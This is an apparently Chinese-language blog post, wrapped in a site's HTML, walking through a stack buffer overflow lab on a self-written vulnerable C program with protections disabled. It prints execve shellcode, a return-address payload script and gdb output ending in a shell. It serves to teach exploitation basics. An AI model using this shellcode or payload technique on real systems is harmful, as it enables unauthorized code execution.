@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.void0red.top","root":"/","scheme":"Pisces","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="this is a test, not true  0x00准备 本次实验的机器为Ubuntu 16.04.2 LTS64位系统  需要关闭ASLR，echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space，如果提示权限不够，可能需要用su提升权限  用gcc编译需要关闭stack-protector，允许栈的执行权限execstack  需要gdb ped">
+<meta property="og:type" content="article">
+<meta property="og:title" content="overflow">
+<meta property="og:url" content="https://blog.void0red.top/2017/11/09/overflow/index.html">
+<meta property="og:site_name" content="void0red&#39;s blog">
+<meta property="og:description" content="this is a test, not true  0x00准备 本次实验的机器为Ubuntu 16.04.2 LTS64位系统  需要关闭ASLR，echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space，如果提示权限不够，可能需要用su提升权限  用gcc编译需要关闭stack-protector，允许栈的执行权限execstack  需要gdb ped">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.void0red.top/images/overflow_0.png">
+<meta property="og:image" content="https://blog.void0red.top/images/overflow_1.png">
+<meta property="article:published_time" content="2017-11-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-02-11T02:27:24.375Z">
+<meta property="article:author" content="void0red">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.void0red.top/images/overflow_0.png">
+
+<link rel="canonical" href="https://blog.void0red.top/2017/11/09/overflow/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>overflow | void0red's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">void0red's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blog.void0red.top/2017/11/09/overflow/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="void0red">
+      <meta itemprop="description" content="stupid">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="void0red's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          overflow
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-11-09 00:00:00" itemprop="dateCreated datePublished" datetime="2017-11-09T00:00:00+08:00">2017-11-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-02-11 10:27:24" itemprop="dateModified" datetime="2020-02-11T10:27:24+08:00">2020-02-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>this is a test, not true</p>
+</blockquote>
+<h2 id="0x00准备"><a href="#0x00准备" class="headerlink" title="0x00准备"></a>0x00准备</h2><ul>
+<li><p>本次实验的机器为<code>Ubuntu 16.04.2 LTS</code>64位系统</p>
+</li>
+<li><p>需要关闭ASLR，<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>，如果提示权限不够，可能需要用<code>su</code>提升权限</p>
+</li>
+<li><p>用<code>gcc</code>编译需要关闭<code>stack-protector</code>，允许栈的执行权限<code>execstack</code></p>
+</li>
+<li><p>需要<code>gdb</code> <code>peda</code> <code>python2</code></p>
+</li>
+<li><p>需要一串<code>shellcode</code>，本次使用</p>
+<p><code>\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</code></p>
+<a id="more"></a></li>
+<li><p>一段计算地址的c语言程序<code>getenvaddr</code>，源码在github可以找到，也可以选择下面的编译</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *ptr;</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		ptr = getenv(argv[<span class="number">1</span>]); <span class="comment">/* Get environment variable location */</span></span><br><span class="line">		ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>])) * <span class="number">2</span>; <span class="comment">/* Adjust for program name */</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%s will be at %p\n"</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">	&#125;</span><br><span class="line">  	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<ul>
+<li><p>攻击目标<code>test.c</code>，自己写的很简单</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">read</span>(<span class="number">0</span>,buf,<span class="number">40</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"23333\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="0x01分析"><a href="#0x01分析" class="headerlink" title="0x01分析"></a>0x01分析</h2><p>通过观察很容易发现程序存在溢出漏洞，字符数组buf只申请了10个字节（10×1）的空间，而read函数却读入了40个字节。使用<code>gcc -g -fno-stack-protector -z execstack -o test test.c</code>编译源文件，用<code>gdb</code>调试程序</p>
+<p>查看main函数处的汇编代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000400566 &lt;+0&gt;:	push   rbp				;rbp入栈，保存堆栈帧</span><br><span class="line">   0x0000000000400567 &lt;+1&gt;:	mov    rbp,rsp				;rsp存到rbp中，确定了新的堆栈帧</span><br><span class="line">   0x000000000040056a &lt;+4&gt;:	sub    rsp,0x10				;rsp减16，栈顶变动，为buf开辟了栈空间</span><br><span class="line">   0x000000000040056e &lt;+8&gt;:	lea    rax,[rbp-0x10]			;将栈顶的地址存到rax中</span><br><span class="line">   0x0000000000400572 &lt;+12&gt;:	mov    edx,0x28				;将40存到edx中</span><br><span class="line">   0x0000000000400577 &lt;+17&gt;:	mov    rsi,rax				;传递栈顶地址，rsi存储buf的开始地址</span><br><span class="line">   0x000000000040057a &lt;+20&gt;:	mov    edi,0x0				;将0存到edi中</span><br><span class="line">   0x000000000040057f &lt;+25&gt;:	call   0x400440 &lt;read@plt&gt;		;调用read函数</span><br><span class="line">   0x0000000000400584 &lt;+30&gt;:	mov    edi,0x400624			</span><br><span class="line">   0x0000000000400589 &lt;+35&gt;:	call   0x400430 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040058e &lt;+40&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000400593 &lt;+45&gt;:	leave  </span><br><span class="line">   0x0000000000400594 &lt;+46&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>程序执行到调用read函数，<code>call</code>指令会将下条指令的地址入栈，也就是<code>0x400584</code>，作为返回地址，然后将程序控制权交给read函数。</p>
+<p>下面这张图是一般函数栈的构造：</p>
+<p><img src="/images/overflow_0.png" alt=""></p>
+<p>这里栈内大概是这个样子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rbp					&lt;- 高地址</span><br><span class="line">[]		;空处4字节</span><br><span class="line">buf[9]-buf[8]	;空出2字节</span><br><span class="line">buf[7]-buf[4]</span><br><span class="line">buf[3]-buf[0]</span><br><span class="line">0x400584				&lt;- 低地址</span><br></pre></td></tr></table></figure>
+
+<p>然后read函数读入数据，程序给buf变量实际分配了16字节，为了寻址的方便还有一部分作为保留，一定程度上避免了溢出的发生。</p>
+<p>尝试输入32字节的数据<code>0123456789abcdef0123456789abcdef</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ run</span><br><span class="line">0123456789abcdef0123456789abcdef</span><br><span class="line">23333</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br></pre></td></tr></table></figure>
+
+<p>程序发生了溢出，并且停在了<code>ret</code>指令处，很容易发现<code>rsp</code>，<code>rbp</code>处的值似乎都被输入覆盖了。</p>
+<p>所以read读取完发生了什么？此时栈相当于：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x400584				;返回地址  	 &lt;- 高地址</span><br><span class="line">rbp（main）</span><br><span class="line">...					&lt;-rbp</span><br><span class="line">...</span><br><span class="line">&#123;buf</span><br><span class="line">...</span><br><span class="line">...&#125;					&lt;-rsp		&lt;- 低地址</span><br></pre></td></tr></table></figure>
+
+<p>函数需要返回，有一条<code>leave</code>指令，将<code>rbp</code>拷贝到<code>rsp</code>中，相当于清除了为局部变量分配的空间，此时栈相当于：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x400584				;返回地址  	  &lt;- 高地址</span><br><span class="line">rbp（main）</span><br><span class="line">					&lt;-rbp,rsp	 &lt;- 低地址</span><br></pre></td></tr></table></figure>
+
+<p><code>leave</code>指令还有一个作用是弹栈，即将栈顶的数据弹出到<code>ebp</code>中，也就恢复了main函数的堆栈帧，此时栈相当于：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x400584				;返回地址  	  &lt;- 高地址</span><br><span class="line">					&lt;-rsp		 &lt;- 低地址</span><br></pre></td></tr></table></figure>
+
+<p>接下来，有一条<code>ret</code>指令，弹栈，即将栈顶的数据弹出到<code>rip</code>中，因为<code>rip</code>存储的是当前指令的地址，也就是将返回地址存入了下一个指令的地址，达到了控制权从read函数到main函数的目的。</p>
+<p>这时，思路就很清晰了，只需要合适的数据将返回地址覆盖，程序就会跳转到合适的地方。</p>
+<p><img src="/images/overflow_1.png" alt=""></p>
+<h2 id="0x02确定返回地址的偏移量"><a href="#0x02确定返回地址的偏移量" class="headerlink" title="0x02确定返回地址的偏移量"></a>0x02确定返回地址的偏移量</h2><p>首先，我们需要确定输入到达返回地址所需字节数。</p>
+<p>可以使用<code>peda</code>的<code>pattern_creat</code>创造一个40字节的字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_create 40 a.txt</span><br><span class="line">Writing pattern of 40 chars to filename &quot;a.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p>将字符串传入并执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r &lt; a.txt</span><br><span class="line">Starting program: &#x2F;home&#x2F;void0red&#x2F;Documents&#x2F;pwn&#x2F;test &lt; a.txt</span><br><span class="line">23333</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x400589 &lt;main+35&gt;:	call   0x400430 &lt;puts@plt&gt;</span><br><span class="line">   0x40058e &lt;main+40&gt;:	mov    eax,0x0</span><br><span class="line">   0x400593 &lt;main+45&gt;:	leave  </span><br><span class="line">&#x3D;&gt; 0x400594 &lt;main+46&gt;:	ret    </span><br><span class="line">   0x400595:	nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x40059f:	nop</span><br><span class="line">   0x4005a0 &lt;__libc_csu_init&gt;:	push   r15</span><br><span class="line">   0x4005a2 &lt;__libc_csu_init+2&gt;:	push   r14</span><br></pre></td></tr></table></figure>
+
+<p>程序停在了<code>ret</code>指令的地方，因为覆盖返回地址的是一串无意义的值，无法进行跳转，上一步操作将<code>rbp</code>（寄存器）的值拷贝到<code>rsp</code>（寄存器）中，导致<code>rsp</code>指向了存储返回地址的栈空间，通过查看<code>rsp</code>指向的栈的数据，可以算出返回地址在栈中，相距未读入数据时栈顶的偏移量。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;wx $rsp</span><br><span class="line">0x7fffffffdd08:	0x44414128</span><br></pre></td></tr></table></figure>
+
+<p>可以看出原本存放返回地址的的栈上现在存放的是<code>0x44414128</code></p>
+<p>用<code>pattern_offest</code>计算偏移量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_offset 0x44414128</span><br><span class="line">1145127208 found at offset: 24</span><br></pre></td></tr></table></figure>
+
+<p>OK，偏移量为24，也就是说输入值的前24个字节是任意的（注意不要存在<code>\x00</code>之类的字节，可能会导致读入终止），接在后面存入8个字节的地址，就能够实现跳转。</p>
+<h2 id="0x03确定shellcode的地址"><a href="#0x03确定shellcode的地址" class="headerlink" title="0x03确定shellcode的地址"></a>0x03确定shellcode的地址</h2><p>因为选择的<code>shellcode地址</code>为27字节，前面的填充数据要用24字节，合起来超过40字节，无法写入，不如将包含<code>shellcode</code>的指令放入系统环境，用于测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PWN&#x3D;&#96;python -c &#39;print&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;&#39;&#96;</span><br></pre></td></tr></table></figure>
+
+<p>用<code>getenvaddr</code>来确定<code>PWN</code>变量对<code>test</code>输入的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ export PWN&#x3D;&#96;python -c &#39;print&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;&#39;&#96;</span><br><span class="line">$ .&#x2F;getenvaddr PWN .&#x2F;test</span><br><span class="line">PWN will be at 0x7fffffffed03</span><br></pre></td></tr></table></figure>
+
+<p>得到地址<code>0x7fffffffed03</code></p>
+<h2 id="0x04编写Payload"><a href="#0x04编写Payload" class="headerlink" title="0x04编写Payload"></a>0x04编写Payload</h2><p>用python的struct模块写payload的话很方便</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line">buf = <span class="string">'A'</span> * <span class="number">24</span> + pack(<span class="string">'&lt;Q'</span>,<span class="number">0x7fffffffed03</span>)</span><br><span class="line">f = open(<span class="string">'a.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">f.write(buf)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<p><code>pack</code>函数用来处理数据很方便：）</p>
+<p><code>pack(format,var0,var1...)</code>按照给定的格式(format)，把后面数据封装成字符串，<code>&lt;</code>是按照小端序，<code>Q</code>是无符号的八字节整数</p>
+<h2 id="0x05测试"><a href="#0x05测试" class="headerlink" title="0x05测试"></a>0x05测试</h2><p>通过管道的方式输入文件的数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ (cat a.txt;cat)|.&#x2F;test</span><br><span class="line">23333</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">void0red</span><br></pre></td></tr></table></figure>
+
+<p>经过测试，确实的得到了shell</p>
+<h2 id="0x06总结"><a href="#0x06总结" class="headerlink" title="0x06总结"></a>0x06总结</h2><p>主要是搞清楚函数调用与返回时栈的变化，测试过程中关闭了防护措施</p>
+<ul>
+<li>ASLR</li>
+<li>stack-protector</li>
+<li>execstack</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2017/11/05/a_letter/" rel="prev" title="a letter">
+      <i class="fa fa-chevron-left"></i> a letter
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2017/11/10/ret2libc/" rel="next" title="ret2libc">
+      ret2libc <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00准备"><span class="nav-number">1.</span> <span class="nav-text">0x00准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01分析"><span class="nav-number">2.</span> <span class="nav-text">0x01分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02确定返回地址的偏移量"><span class="nav-number">3.</span> <span class="nav-text">0x02确定返回地址的偏移量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03确定shellcode的地址"><span class="nav-number">4.</span> <span class="nav-text">0x03确定shellcode的地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04编写Payload"><span class="nav-number">5.</span> <span class="nav-text">0x04编写Payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05测试"><span class="nav-number">6.</span> <span class="nav-text">0x05测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06总结"><span class="nav-number">7.</span> <span class="nav-text">0x06总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="void0red"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">void0red</p>
+  <div class="site-description" itemprop="description">stupid</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/void0red" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;void0red" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:void0red@gmail.com" title="E-Mail → mailto:void0red@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">void0red</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.7.1
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
